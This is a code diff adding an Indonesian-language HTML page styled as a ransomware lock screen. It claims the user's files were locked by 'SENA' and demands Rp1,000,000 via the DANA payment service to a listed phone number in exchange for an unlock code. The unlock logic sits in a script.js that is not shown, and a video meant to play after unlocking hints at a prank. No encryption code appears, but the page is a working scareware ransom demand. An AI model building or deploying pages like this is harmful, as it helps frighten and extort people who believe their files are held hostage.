@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>System Locked</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <!-- POPUP UTAMA -->
+  <div class="popup" id="popup">
+    <h2>🔒 SISTEM TERKUNCI</h2>
+    <p><strong>File Anda telah dikunci oleh SENA.</strong></p>
+    <p>Silakan lakukan pembayaran sebesar <span class="highlight">Rp1.000.000</span> untuk membuka kembali file Anda.</p>
+    <p>Pembayaran melalui DANA ke:</p>
+    <p class="highlight">088985117630</p>
+    <p><em>Setelah pembayaran, masukkan kode untuk membuka file.</em></p>
+    <input type="password" id="unlockKey" placeholder="Masukkan kode rahasia" />
+    <button class="btn" onclick="checkKey()">OKE</button>
+    <p id="status" class="error-message"></p>
+  </div>
+
+  <!-- MODAL SUKSES -->
+  <div id="successModal" class="success-modal">
+    ✅ Sistem berhasil dibuka.
+  </div>
+
+  <!-- VIDEO JEDAK-JEDUK -->
+  <video id="unlockVideo" width="100%" controls autoplay style="display: none;">
+    <source src="jedakjeduk.mp4" type="video/mp4" />
+    Maaf, browser Anda tidak mendukung pemutaran video.
+  </video>
+
+  <script src="script.js"></script>
+</body>
+</html>
